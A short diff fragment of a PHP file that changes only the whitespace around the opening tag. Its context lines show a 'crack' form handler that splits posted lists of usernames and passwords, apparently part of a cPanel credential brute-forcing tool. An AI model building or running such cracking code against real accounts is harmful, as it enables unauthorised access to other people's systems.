@@ -1,5 +1,4 @@
-<?php
-
+ <?php
 	if($_POST['crack']) {
 		$usercp = explode("\r\n", $_POST['user_cp']);
 		$passcp = explode("\r\n", $_POST['pass_cp']);
